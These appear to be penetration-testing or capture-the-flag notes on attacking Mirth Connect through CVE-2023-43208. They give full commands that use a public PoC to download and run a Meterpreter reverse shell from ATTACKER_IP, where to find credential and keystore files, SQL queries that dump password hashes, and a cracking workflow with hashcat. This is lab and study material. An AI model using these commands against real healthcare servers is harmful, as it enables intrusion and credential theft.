# Mirth Connect (NextGen Healthcare)

Mirth Connect is a healthcare integration platform (HL7, etc.) with a web-based Administrator (Jetty). Versions prior to 4.4.1 are affected by **CVE-2023-43208** (unauthenticated RCE).

---

## Recon

- **Ports:** 80/443 (Jetty, Mirth Connect Administrator), 22 (SSH), 6661 (Mirth).
- **Web:** Title "Mirth Connect Administrator". Webadmin at `/webadmin/Index.action`.
- **Default credentials:** `admin` / `admin` (often changed).
- **Hosts:** Add `TARGET_IP mirth-connect.htb` (or target hostname) to `/etc/hosts` if the app expects a specific hostname.

---

## CVE-2023-43208 – Unauthenticated RCE

- **Affected:** NextGen Healthcare Mirth Connect **&lt; 4.4.1**.
- **References:**
  - [GitHub nextgenhealthcare/connect issue #6340](https://github.com/nextgenhealthcare/connect/issues/6340)
  - [CVE-2023-43208 PoC (jakabakos)](https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc)

**Usage (Unix):**

```bash
# Verify connectivity (ICMP)
sudo tcpdump -i tun0 icmp
python3 CVE-2023-43208.py -u https://TARGET -c "ping -c4 ATTACKER_IP" -p unix

# Execute command (e.g. wget binary – use -O for output path)
python3 CVE-2023-43208.py -u https://TARGET -c "wget -O /dev/shm/shell.elf http://ATTACKER_IP:8000/shell.elf" -p unix
python3 CVE-2023-43208.py -u https://TARGET -c "chmod +x /dev/shm/shell.elf" -p unix
python3 CVE-2023-43208.py -u https://TARGET -c "/dev/shm/shell.elf" -p unix
```

**Reverse shell (Meterpreter):**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f elf -o shell.elf
python3 -m http.server
# On target via exploit: wget -O /dev/shm/shell.elf http://... ; chmod +x /dev/shm/shell.elf ; /dev/shm/shell.elf
msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 9001; run -j"
```

---

## Post-exploitation – Credential and config locations

- **Install path (Linux):** `/usr/local/mirthconnect` (run as user `mirth`).
- **Config:** `/usr/local/mirthconnect/conf/mirth.properties` – DB URL, DB user/pass, **keystore path and passwords**.
- **Keystore (JCEKS):** Often `keystore.path` under app data (e.g. `/var/lib/mirthconnect/keystore.jks`). Passwords in `mirth.properties`: `keystore.storepass`, `keystore.keypass`.
- **Database:** Default backend is Derby/PostgreSQL/MySQL/MariaDB; connection details in `mirth.properties` (e.g. `database.url`, `database.username`, `database.password`).

Example `mirth.properties` snippet:

```properties
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = ...
keystore.keypass = ...
```

---

## Database – User and password hashes

- **Tables:** `PERSON` (usernames, roles), `PERSON_PASSWORD` (password hashes).
- **Connect (from host with DB access, e.g. as `mirth`):**

```bash
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
```

```sql
SELECT * FROM PERSON;
SELECT * FROM PERSON_PASSWORD;
```

- **Hash format (4.4.0+):** Mirth 4.4.0+ uses **PBKDF2WithHmacSHA256** with **600,000 iterations** (configurable; older versions used SHA-256 with 1,000 iterations). Stored value is Base64-encoded: **first 8 bytes = salt**, **remainder = PBKDF2 hash**. Not plain SHA-256; use hashcat mode **10900** (PBKDF2-HMAC-SHA256) after converting (see below).

---

## Cracking Mirth Connect password hashes (hashcat)

1. **Get raw Base64 from DB:** e.g. `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`
2. **Decode and split:** first 8 bytes = salt, rest = hash. Re-encode each as Base64 and strip trailing `=` for hashcat.
3. **Hashcat format:** `sha256:600000:SALT:HASH` (iterations may be 1000 on older Mirth).

Python to build hashcat line:

```python
import base64
decoded = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
salt_b64 = base64.b64encode(decoded[:8]).decode().rstrip("=")
hash_b64 = base64.b64encode(decoded[8:]).decode().rstrip("=")
# Mirth 4.4.0+ default: 600000 iterations
print(f"sha256:600000:{salt_b64}:{hash_b64}")
```

```bash
hashcat -a0 -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Keystore (JCEKS)

- **Purpose:** Server cert and encryption keys (message/export encryption).
- **View/extract:** Use [KeyStore Explorer](https://keystore-explorer.org/downloads.html) or `keytool`; unlock with `keystore.storepass`. Key pass for private key entry: `keystore.keypass`.

---

## Privilege escalation – Reaching local-only services

If a service (e.g. Flask app) listens only on `127.0.0.1` and you have SSH as a user:

```bash
ssh user@TARGET -L 54321:127.0.0.1:54321
# Then from your machine: curl http://127.0.0.1:54321/...
```

Look for custom scripts (e.g. `/usr/local/bin/notif.py`) that accept user-controlled input and pass it into `eval()` or format strings—see [Python eval() in f-string / format string](../Web/ssti.md#python-eval-in-f-string--format-string) in the Web SSTI section.
